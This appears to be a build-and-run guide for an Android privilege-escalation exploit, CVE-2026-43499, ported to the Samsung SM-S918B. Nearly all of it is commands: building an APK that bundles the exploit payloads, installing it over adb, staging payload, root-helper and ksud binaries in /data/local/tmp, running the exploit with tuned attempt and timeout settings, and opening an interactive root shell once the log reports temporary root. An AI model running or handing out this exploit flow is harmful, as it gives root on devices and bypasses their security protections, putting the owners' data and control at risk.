# Build, Install, And ADB

This page covers the practical local flow after the port files are available.
The script can build the APK, install it, and stage files on the device.

## Build The Debug APK

Generate the payload, prepare app assets, and build the debug APK:

```sh
./tools/port-sm-s918b-afzf5.sh --build-apk
```

APK output:

```text
app/build/outputs/apk/debug/app-debug.apk
```

The AFZH3 profile in this APK selects
`app/src/main/assets/cve-2026-43499-app-afzh3-tuned.so`. The AFZG1 profile
continues to select its existing payload.

Manual Gradle build:

```sh
./gradlew :app:assembleDebug
```

## Install The APK

Install a previously built APK:

```sh
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

Or let the script build and install:

```sh
./tools/port-sm-s918b-afzf5.sh --build-apk --install-apk
```

## Stage Files With ADB

Prepare the runtime files under `/data/local/tmp`:

```sh
./tools/port-sm-s918b-afzf5.sh --stage-adb
```

Device paths:

```text
/data/local/tmp/rmg-dm3q/cve-2026-43499-app.so
/data/local/tmp/rmg-dm3q/libcve43499root
/data/local/tmp/rmg-dm3q/ksud-f731u-kdp
/data/local/tmp/libcve43499root
/data/local/tmp/ksud-selected
/data/local/tmp/rmg-dm3q/exploit.log
```

## Full Local Flow

Run every automated step:

```sh
./tools/port-sm-s918b-afzf5.sh --all
```

This does:

```text
1. Validate the connected SM-S918B target.
2. Generate the patched payload.
3. Prepare app assets and jniLibs.
4. Build the debug APK.
5. Install the APK on the device.
6. Stage payload/helper/ksud files under /data/local/tmp.
7. Print manual test commands.
```

## Manual ADB Test Commands

AFZH3 tuned POC:

```sh
adb shell 'EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=45 EXPLOIT_ATTEMPT_TIMEOUT_SEC=60 PSELECT_DELAY_USEC=20000 /data/local/tmp/rmg-afzh3/libcve43499root-afzh3 --run-payload /data/local/tmp/rmg-afzh3/cve-2026-43499-app-afzh3-tuned.so /data/local/tmp/rmg-afzh3/libcve43499root-afzh3 /data/local/tmp/rmg-afzh3/exploit.log'
```

Run one attempt and write the log:

```sh
adb shell 'EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=45 EXPLOIT_ATTEMPT_TIMEOUT_SEC=120 /data/local/tmp/libcve43499root --run-payload /data/local/tmp/rmg-dm3q/cve-2026-43499-app.so /data/local/tmp/libcve43499root /data/local/tmp/rmg-dm3q/exploit.log'
```

After the log shows `temporary-root-ready`, open an interactive shell through
the helper:

```sh
adb shell -t '/data/local/tmp/libcve43499root -c "/system/bin/sh -i"'
```

Check the log:

```sh
adb shell 'cat /data/local/tmp/rmg-dm3q/exploit.log'
```

## Notes

The script intentionally does not open a root shell automatically. It stages
files and prints commands so the operator can review the state before running
the manual test.
